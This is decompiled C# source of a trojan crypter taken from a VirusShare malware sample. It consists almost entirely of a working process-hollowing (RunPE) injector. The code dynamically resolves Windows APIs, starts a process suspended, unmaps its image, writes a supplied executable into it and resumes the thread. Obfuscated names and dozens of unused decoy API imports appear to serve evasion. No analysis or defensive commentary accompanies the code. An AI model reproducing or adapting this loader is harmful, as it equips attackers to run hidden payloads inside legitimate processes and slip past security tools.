// Decompiled with JetBrains decompiler
// Type: WindowsApplication1.DSFSGDSFAG
// Assembly: WindowsApplication1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8D73E931-24E6-4CCE-8F83-850E53A4BA2D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\HEUR-Trojan.MSIL.Crypt.m-5522d130930494e11d3128901a6e3e35095e8f7ad38200f5b678b983bfd0f6ac.exe

using Microsoft.VisualBasic;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace WindowsApplication1
{
  public class DSFSGDSFAG
  {
    public const long FHSDHGFVSD = 2778;
    public const long GDFHSGGFHFSD = 60116;
    public const long HFGFDSGSDF = 218;
    public const long GDSFGHFDSAGDS = 218;
    public const long FDSAFGFDS = 218;
    public const long GDFHDFGDS = 253;
    public const long GFDGASDFSD = 218;
    public const long GFHDSGDSF = 17247;
    public const uint GDFHDSFGSD = 218;

    [DebuggerNonUserCode]
    public DSFSGDSFAG()
    {
    }

    public static void GFDGDFSHS(byte[] DAS4DA3, string VVVVVVCAE)
    {
      DSFSGDSFAG.Context context = new DSFSGDSFAG.Context();
      DSFSGDSFAG.Process_Information das3 = new DSFSGDSFAG.Process_Information();
      DSFSGDSFAG.Startup_Information das43fsa = new DSFSGDSFAG.Startup_Information();
      DSFSGDSFAG.Security_Flags DASCASE = new DSFSGDSFAG.Security_Flags();
      DSFSGDSFAG.Security_Flags CASE222 = new DSFSGDSFAG.Security_Flags();
      GCHandle gcHandle = GCHandle.Alloc((object) DAS4DA3, GCHandleType.Pinned);
      IntPtr ptr = gcHandle.AddrOfPinnedObject();
      int int32 = ptr.ToInt32();
      DSFSGDSFAG.DOS_Header dosHeader1 = new DSFSGDSFAG.DOS_Header();
      object structure1 = Marshal.PtrToStructure(gcHandle.AddrOfPinnedObject(), dosHeader1.GetType());
      DSFSGDSFAG.DOS_Header dosHeader2;
      DSFSGDSFAG.DOS_Header dosHeader3 = structure1 != null ? (DSFSGDSFAG.DOS_Header) structure1 : dosHeader2;
      gcHandle.Free();
      DSFSGDSFAG.GFDSHADFFG gfdshadffg = DSFSGDSFAG.TXXY5U8D2U<DSFSGDSFAG.GFDSHADFFG>("kernel32", "CreateProcessA");
      DSFSGDSFAG.GFDSGSDFGDS gfdsgsdfgds = DSFSGDSFAG.TXXY5U8D2U<DSFSGDSFAG.GFDSGSDFGDS>("kernel32", "GetThreadContext");
      DSFSGDSFAG.FDGDFHSDFGDS fdgdfhsdfgds1 = DSFSGDSFAG.TXXY5U8D2U<DSFSGDSFAG.FDGDFHSDFGDS>("kernel32", "ReadProcessMemory");
      DSFSGDSFAG.DGASDFASDFS dgasdfasdfs1 = DSFSGDSFAG.TXXY5U8D2U<DSFSGDSFAG.DGASDFASDFS>("kernel32", "WriteProcessMemory");
      DSFSGDSFAG.GFDSGDSAF gfdsgdsaf = DSFSGDSFAG.TXXY5U8D2U<DSFSGDSFAG.GFDSGDSAF>("ntdll", "ZwUnmapViewOfSection");
      DSFSGDSFAG.FDSAGDFSGSD fdsagdfsgsd = DSFSGDSFAG.TXXY5U8D2U<DSFSGDSFAG.FDSAGDFSGSD>("kernel32", "VirtualAllocEx");
      DSFSGDSFAG.GADFHDFAGDA gadfhdfagda = DSFSGDSFAG.TXXY5U8D2U<DSFSGDSFAG.GADFHDFAGDA>("kernel32", "SetThreadContext");
      DSFSGDSFAG.DFHFGDFASGSADV dfhfgdfasgsadv = DSFSGDSFAG.TXXY5U8D2U<DSFSGDSFAG.DFHFGDFASGSADV>("kernel32", "ResumeThread");
      IntPtr DSA43R3W;
      if (-(gfdshadffg((string) null, VVVVVVCAE, ref DASCASE, ref CASE222, false, 4U, DSA43R3W, (string) null, ref das43fsa, out das3) ? 1 : 0) == 0)
        return;
      DSFSGDSFAG.NT_Headers ntHeaders1 = new DSFSGDSFAG.NT_Headers();
      ptr = new IntPtr(checked (int32 + dosHeader3.DASE3ASDAS));
      object structure2 = Marshal.PtrToStructure(ptr, ntHeaders1.GetType());
      DSFSGDSFAG.NT_Headers ntHeaders2;
      DSFSGDSFAG.NT_Headers ntHeaders3 = structure2 != null ? (DSFSGDSFAG.NT_Headers) structure2 : ntHeaders2;
      das43fsa.CSZE = Strings.Len((object) das43fsa);
      context.II69TOHMUR = 65539U;
      if (ntHeaders3.SSSSSSSSSSSQ != 17744U | dosHeader3.DASDASFASF != (ushort) 23117 || -(gfdshadffg((string) null, VVVVVVCAE, ref DASCASE, ref CASE222, false, 4U, DSA43R3W, (string) null, ref das43fsa, out das3) ? 1 : 0) == 0)
        return;
      int num1 = gfdsgsdfgds(das3.RFSER, ref context) ? 1 : 0;
      DSFSGDSFAG.FDGDFHSDFGDS fdgdfhsdfgds2 = fdgdfhsdfgds1;
      IntPtr daS4Qqw1 = das3.DAS4QQW;
      int AL8ZCRFWNU1 = checked ((int) ((long) context.WDA + 8L));
      long num2;
      int num3 = checked ((int) num2);
      ref int local1 = ref num3;
      int num4 = 0;
      ref int local2 = ref num4;
      int num5 = fdgdfhsdfgds2(daS4Qqw1, AL8ZCRFWNU1, ref local1, 4, ref local2);
      long AL8ZCRFWNU2 = (long) num3;
      long num6 = gfdsgdsaf(das3.DAS4QQW, checked ((int) AL8ZCRFWNU2));
      uint num7 = checked ((uint) (int) fdsagdfsgsd(das3.DAS4QQW, (int) ntHeaders3.OOOU.DFAZDASD, ntHeaders3.OOOU.DASRDASRASR, 12288U, 4U));
      if (num7 != 0U)
      {
        DSFSGDSFAG.DGASDFASDFS dgasdfasdfs2 = dgasdfasdfs1;
        IntPtr daS4Qqw2 = das3.DAS4QQW;
        int AL8ZCRFWNU3 = checked ((int) num7);
        byte[] DSAE32_1 = DAS4DA3;
        int wqdasdasd = checked ((int) ntHeaders3.OOOU.WQDASDASD);
        uint num8;
        int num9 = checked ((int) num8);
        ref int local3 = ref num9;
        int num10 = dgasdfasdfs2(daS4Qqw2, AL8ZCRFWNU3, DSAE32_1, wqdasdasd, out local3) ? 1 : 0;
        uint num11 = checked ((uint) num9);
        long num12 = (long) checked (dosHeader3.DASE3ASDAS + 248);
        int num13 = checked ((int) ntHeaders3.DSEEEEE.DAAAAAAAA3 - 1);
        int num14 = 0;
        while (num14 <= num13)
        {
          ptr = new IntPtr(checked ((long) int32 + num12 + (long) (num14 * 40)));
          DSFSGDSFAG.Section_Header sectionHeader1;
          object structure3 = Marshal.PtrToStructure(ptr, sectionHeader1.GetType());
          DSFSGDSFAG.Section_Header sectionHeader2;
          sectionHeader1 = structure3 != null ? (DSFSGDSFAG.Section_Header) structure3 : sectionHeader2;
          byte[] numArray = new byte[checked ((int) sectionHeader1.DA22S3 + 1)];
          int num15 = checked ((int) ((long) sectionHeader1.DA22S3 - 1L));
          int index = 0;
          while (index <= num15)
          {
            numArray[index] = DAS4DA3[checked ((int) ((long) sectionHeader1.PoinEEter + (long) index))];
            checked { ++index; }
          }
          DSFSGDSFAG.DGASDFASDFS dgasdfasdfs3 = dgasdfasdfs1;
          IntPtr daS4Qqw3 = das3.DAS4QQW;
          int AL8ZCRFWNU4 = checked ((int) (num7 + sectionHeader1.AL8ZCRFWNU));
          byte[] DSAE32_2 = numArray;
          int da22S3 = checked ((int) sectionHeader1.DA22S3);
          int num16 = checked ((int) num11);
          ref int local4 = ref num16;
          int num17 = dgasdfasdfs3(daS4Qqw3, AL8ZCRFWNU4, DSAE32_2, da22S3, out local4) ? 1 : 0;
          num11 = checked ((uint) num16);
          checked { ++num14; }
        }
        byte[] bytes = BitConverter.GetBytes(num7);
        DSFSGDSFAG.DGASDFASDFS dgasdfasdfs4 = dgasdfasdfs1;
        IntPtr daS4Qqw4 = das3.DAS4QQW;
        int AL8ZCRFWNU5 = checked ((int) ((long) context.WDA + 8L));
        byte[] DSAE32_3 = bytes;
        int num18 = checked ((int) num11);
        ref int local5 = ref num18;
        int num19 = dgasdfasdfs4(daS4Qqw4, AL8ZCRFWNU5, DSAE32_3, 4, out local5) ? 1 : 0;
        num8 = checked ((uint) num18);
        context.AS4 = checked (num7 + ntHeaders3.OOOU.DDDDDDDDAAA);
        int num20 = gadfhdfagda(das3.RFSER, ref context) ? 1 : 0;
        int num21 = (int) dfhfgdfasgsadv(das3.RFSER);
      }
    }

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string tr6);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr gdr54, [MarshalAs(UnmanagedType.VBByRefStr)] ref string gfsd54);

    [DllImport("DSFSGDSFAGcns4.dll", EntryPoint = "DSFSGDSFAGcNsProfileEltAddA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long DSFSGDSFAGcNsProfileEltAdd(
      long ProfileNameSyntax,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string ProfileName,
      ref IntPtr IfId,
      long MemberNameSyntax,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string MemberName,
      long Priority,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string Annotation);

    [DllImport("wldap32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long ldap_close_extended_op(ref IntPtr ld, long MessageNumber);

    [DllImport("tapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long lineSetAppSpecific(long hCall, long dwAppSpecific);

    [DllImport("rtm.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long MgmGetNextMfeStats(
      ref IntPtr pimmStart,
      ref long pdwBufferSize,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string pbBuffer,
      ref long pdwNumEntries);

    [DllImport("mprapi.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long MprAdminDeviceEnum(
      ref IntPtr hMprServer,
      long dwLevel,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lplpbBuffer,
      ref long lpdwTotalEntries);

    [DllImport("MSI.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long MsiDatabaseImport(
      ref IntPtr hDatabase,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string szFoldeDSFSGDSFAGath,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string szFileName);

    [DllImport("DSFSGDSFAGcrt4.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long NdrMesSimpleTypeAlignSize(long handle_t);

    [DllImport("NETAPI32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long NetMessageNameDel([MarshalAs(UnmanagedType.VBByRefStr)] ref string servername, [MarshalAs(UnmanagedType.VBByRefStr)] ref string msgname);

    [DllImport("NETAPI32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long NetReplExportDirSetInfo(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string servername,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string dirname,
      long level,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string buf,
      ref long parm_err);

    [DllImport("NETAPI32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long NetUseGetInfo(
      ref IntPtr UncServerName,
      ref IntPtr UseName,
      long level,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string bufptr);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long QueueUserWorkItem(long lFunction, ref long Context, long Flags);

    [DllImport("kernel32.dll", EntryPoint = "ReadConsoleInputA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long ReadConsoleInput(
      long hConsoleInput,
      ref IntPtr lpBuffer,
      long nLength,
      ref long lpNumberOfEventsRead);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long ShowWindowAsync(long hWnd, long nCmdShow);

    [DllImport("mgmtapi.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long SnmpMgrCtl(
      ref IntPtr session,
      long dwCtlCode,
      ref long lpvInBuffer,
      long cbInBuffer,
      ref long lpvOUTBuffer,
      long cbOUTBuffer,
      ref long lpcbBytesReturned);

    [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long AddAuditAccessAceEx(
      IntPtr pAcl,
      long dwAceRevision,
      long AceFlags,
      long dwAccessMask,
      ref IntPtr pSid,
      long bAuditSuccess,
      long bAuditFailure);

    [DllImport("ODBCCP32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long SQLInstallerError(
      int iError,
      ref long pfErrorCode,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszErrorMsg,
      int cbErrorMsgMax,
      ref int pcbErrorMsg);

    [DllImport("msorcl32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long SQLSetCursorName(long hstmt, [MarshalAs(UnmanagedType.VBByRefStr)] ref string szCursor, int cbCursor);

    [DllImport("rasapi32.dll", EntryPoint = "RasSetCredentialsA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long RasSetCredentials(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpcstr,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpcstr,
      ref IntPtr TLPRASCREDENTIALSA,
      long @bool);

    [DllImport("kernel32.dll", EntryPoint = "ReadConsoleA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long ReadConsole(
      long hConsoleInput,
      ref long lpBuffer,
      long nNumberOfCharsToRead,
      ref long lpNumberOfCharsRead,
      ref long lpReserved);

    [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long ReadEncryptedFileRaw(
      ref IntPtr pfExportCallback,
      ref long pvCallbackContext,
      ref long pvContext);

    [DllImport("winspool.drv", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long ReadPrinter(
      long hPrinter,
      ref long pBuf,
      long cdBuf,
      ref long pNoBytesRead);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long RegisterHotKey(long hwnd, long id, long fsModifiers, long vk);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long ReleaseSemaphore(
      long hSemaphore,
      long lReleaseCount,
      ref long lpPreviousCount);

    [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GetSiteNameFromSid(ref long pSid, [MarshalAs(UnmanagedType.VBByRefStr)] ref string pwsSite);

    [DllImport("kernel32.dll", EntryPoint = "GetStringTypeExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long GetStringTypeEx(
      long Locale,
      long dwInfoType,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpSrcStr,
      long cchSrc,
      ref int lpCharType);

    [DllImport("kernel32.dll", EntryPoint = "GetVolumePathNameA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long GetVolumePathName(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszFileName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVolumePathName,
      long cchBufferLength);

    [DllImport("user32.dll", EntryPoint = "SetWindowLongA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long SetWindowLong(long hwnd, long nIndex, long dwNewLong);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long TlsSetValue(long dwTlsIndex, ref long lpTlsValue);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr ToAscii(
      long uVirtKey,
      long uScanCode,
      ref byte lpbKeyState,
      ref long lpwTransKey,
      long fuState);

    private static T TXXY5U8D2U<T>(string ASFASE3, string FASGAS543W) => (T) Marshal.GetDelegateForFunctionPointer(DSFSGDSFAG.GetProcAddress(DSFSGDSFAG.LoadLibraryA(ref ASFASE3), ref FASGAS543W), typeof (T));

    public struct Context
    {
      public uint II69TOHMUR;
      public uint d2;
      public uint das;
      public uint d9;
      public uint ad;
      public uint dsa;
      public uint ds;
      public DSFSGDSFAG.Save Save;
      public uint dh;
      public uint sad;
      public uint da;
      public uint MD;
      public uint RD;
      public uint mSI;
      public uint WDA;
      public uint AD3;
      public uint D21;
      public uint AS4;
      public uint K32;
      public uint F2W;
      public uint HHJ;
      public uint ADF5;
      public uint GSSA;
      public uint DSAAA;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
      public byte[] er6rgdr65;
    }

    public struct Save
    {
      public uint KD7JX2MXT;
      public uint JCNS3ZPSXO;
      public uint DAS3;
      public uint DAS23;
      public uint ADSA;
      public uint DAF35;
      public uint FA32D;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
      public byte[] FSDRF43;
      public uint FA32QA;
    }

    public struct Misc
    {
      public uint SDUHRL;
      public uint GSIJ;
    }

    public struct Section_Header
    {
      public byte FSDPOU4PO3;
      public DSFSGDSFAG.Misc Mi2sc;
      public uint AL8ZCRFWNU;
      public uint DA22S3;
      public uint PoinEEter;
      public uint E2Q4RS;
      public uint FS523QF;
      public uint FSB43FSD4;
      public uint QBFAS4E;
      public uint AS32QFZS;
    }

    public struct Process_Information
    {
      public IntPtr DAS4QQW;
      public IntPtr RFSER;
      public int TGJWE;
      public int SDFFFFFFFFFF;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct Startup_Information
    {
      public int CSZE;
      public string FSDR4G;
      public string AAAAAAAAAA;
      public string AADDDDDDD;
      public int ADA;
      public int C;
      public int AEDS;
      public int DASDDDD;
      public int XASE4;
      public int DAS3EDFZ;
      public int DVA3ES;
      public int CCCCQ;
      public short FDSRS;
      public short VYE5X;
      public int KHJKIHJK;
      public int KHJKHJK;
      public int KHJKHJ;
      public int KHJKJHK;
    }

    public struct Security_Flags
    {
      public int GFSETWE;
      public IntPtr EWEWWW;
      public int DASDAS;
    }

    public struct DOS_Header
    {
      public ushort DASDASFASF;
      public ushort QWEQWE;
      public ushort EQWEQWEQWE;
      public ushort HFGHFGHFGH;
      public ushort HFGHFGHFG;
      public ushort DASD444444;
      public ushort DASFASE33;
      public ushort DASKGHJ;
      public ushort DASVZDF;
      public ushort VXCVXC;
      public ushort VXCVXCV;
      public ushort EWECS;
      public ushort EWADC;
      public ushort UADA3;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
      public ushort[] ReservWWWWWWWWWWWWWWWedA;
      public ushort DAS4E;
      public ushort UJJ;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
      public ushort[] DDDDDDDDD;
      public int DASE3ASDAS;
    }

    public struct NT_Headers
    {
      public uint SSSSSSSSSSSQ;
      public DSFSGDSFAG.File_Header DSEEEEE;
      public DSFSGDSFAG.Optional_Headers OOOU;
    }

    public struct File_Header
    {
      public ushort ITTTTTTTT;
      public ushort DAAAAAAAA3;
      public uint HRFTYTYTR;
      public uint GJGFSFS;
      public uint FSVGY;
      public ushort FSFV;
      public ushort A34FFC;
    }

    public struct Optional_Headers
    {
      public ushort WWWWWWWWW;
      public byte MaAAAAAAAAAAAjor;
      public byte MiSSSSSSSSSSSnor;
      public uint SSSSSSSSSSSSS;
      public uint FFFFFFFFFFF;
      public uint XXXXXXXX;
      public uint DDDDDDDDAAA;
      public uint FSSSSSSS;
      public uint RSFS43;
      public uint DFAZDASD;
      public uint SectionA;
      public uint FileA;
      public ushort GDFTDFFFF;
      public ushort HGDFHD564;
      public ushort GD5ERGD;
      public ushort FSD5YHD;
      public ushort ASDASG;
      public ushort AS4ASAS;
      public uint CCC;
      public uint DASRDASRASR;
      public uint WQDASDASD;
      public uint Assssssss;
      public ushort fsd4s;
      public ushort fjio;
      public uint dasrlajstpoi;
      public uint dasdraskyjhuasp;
      public uint SHRedas4wa9uqserve;
      public uint fsdtsysyt;
      public uint eawdasdas3;
      public uint Cocccunt;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
      public DSFSGDSFAG.Data_Directory[] GSDGSDT4;
    }

    public struct Data_Directory
    {
      public uint ewq34q234;
      public uint das34aw33;
    }

    public delegate bool GFDSHADFFG(
      string ASFASE3,
      string DASDAS3E2,
      ref DSFSGDSFAG.Security_Flags DASCASE,
      ref DSFSGDSFAG.Security_Flags CASE222,
      bool DAS432E,
      uint AEDFKJK32,
      IntPtr DSA43R3W,
      string ase32ew,
      [In] ref DSFSGDSFAG.Startup_Information das43fsa,
      out DSFSGDSFAG.Process_Information das3);

    public delegate bool DGASDFASDFS(
      IntPtr DASE32,
      int AL8ZCRFWNU,
      byte[] DSAE32,
      int DASEADAS,
      out int ASD43FA);

    public delegate int FDGDFHSDFGDS(
      IntPtr FASFDASDAS,
      int AL8ZCRFWNU,
      ref int CAS32,
      int ASDASC,
      ref int CASTWE);

    public delegate IntPtr FDSAGDFSGSD(
      IntPtr DASE43E,
      int AL8ZCRFWNU,
      uint DASCAS3,
      uint DAS3,
      uint DAS32);

    public delegate long GFDSGDSAF(IntPtr DASE3, int AL8ZCRFWNU);

    public delegate uint DFHFGDFASGSADV(IntPtr DASEAS);

    public delegate bool GFDSGSDFGDS(IntPtr DASDASC, ref DSFSGDSFAG.Context DSACSA43);

    public delegate bool GADFHDFAGDA(IntPtr GDSFGHFDSAGDS, ref DSFSGDSFAG.Context ASCA434);
  }
}
